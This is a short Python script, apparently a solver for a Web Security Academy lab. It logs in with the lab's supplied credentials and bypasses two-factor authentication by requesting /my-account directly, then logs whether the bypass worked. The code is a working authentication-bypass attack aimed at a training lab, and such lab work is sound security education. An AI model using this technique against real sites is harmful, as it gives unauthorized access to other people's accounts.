from web_security_academy.core.logger import logger


def solve_lab(session):
    session.login("carlos", "montoya", with_csrf=False)

    path = "/my-account"
    logger.info(f'Bypassing 2FA by manually navigating to "{path}"...')

    resp = session.get_path(path)
    if resp.status_code != 200:
        logger.failure("Unable to bypass 2FA.")
    else:
        logger.success("Success.")
